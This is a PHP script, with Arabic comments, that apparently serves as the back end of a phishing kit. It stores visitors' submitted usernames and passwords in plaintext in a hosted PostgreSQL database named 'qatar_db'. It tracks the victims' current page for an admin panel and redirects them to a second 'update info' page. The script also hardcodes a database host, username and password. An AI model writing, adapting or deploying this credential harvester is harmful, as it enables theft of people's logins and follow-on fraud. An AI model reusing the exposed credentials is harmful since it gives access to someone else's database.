<?php
// بيانات الاتصال بقاعدة بيانات PostgreSQL على رندر التي أرسلتها
$host = "dpg-d95vic9oagis739h761g-a";
$user = "qatar_db_user";
$password = "TpPqGoliCoObGDiGdpEc16ak3PJZ9BB1";
$dbname = "qatar_db";
$port = "5432";

try {
    // الاتصال باستخدام PDO بقاعدة بيانات PostgreSQL
    $dsn = "pgsql:host=$host;port=$port;dbname=$dbname;";
    $pdo = new PDO($dsn, $user, $password, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);

    // إنشاء الجداول تلقائياً إن لم تكن موجودة لحفظ البيانات والزيارات
    $pdo->exec("CREATE TABLE IF NOT EXISTS logins (
        id SERIAL PRIMARY KEY,
        visitor_id VARCHAR(50),
        username VARCHAR(255),
        password VARCHAR(255),
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )");

    $pdo->exec("CREATE TABLE IF NOT EXISTS active_visitors (
        visitor_id VARCHAR(50) PRIMARY KEY,
        current_page VARCHAR(255),
        last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )");

    // استقبال البيانات من الفورم
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $visitor_id = $_POST['visitor_id'] ?? 'unknown';
        $username = $_POST['username'] ?? '';
        $password = $_POST['password'] ?? '';

        if (!empty($username) && !empty($password)) {
            // 1. حفظ بيانات العميل في جدول تسجيل الدخول للوحة الأدمن
            $stmt = $pdo->prepare("INSERT INTO logins (visitor_id, username, password) VALUES (:visitor_id, :username, :password)");
            $stmt->execute([
                ':visitor_id' => $visitor_id,
                ':username' => $username,
                ':password' => $password
            ]);

            // 2. تحديث صفحة الزائر الحالية في جدول الزيارات الحية للأدمن
            $stmt_vis = $pdo->prepare("INSERT INTO active_visitors (visitor_id, current_page, last_seen) 
                                       VALUES (:visitor_id, 'صفحة تحديث البيانات', NOW()) 
                                       ON CONFLICT (visitor_id) 
                                       DO UPDATE SET current_page = 'صفحة تحديث البيانات', last_seen = NOW()");
            $stmt_vis->execute([':visitor_id' => $visitor_id]);

            // 3. التوجيه التلقائي للصفحة الثانية (صفحة تحديث البيانات)
            header("Location: update_info.php");
            exit();
        }
    }
} catch (PDOException $e) {
    // في حال حدوث خطأ في الاتصال
    echo "خطأ في الاتصال بقاعدة البيانات: " . $e->getMessage();
}
?>
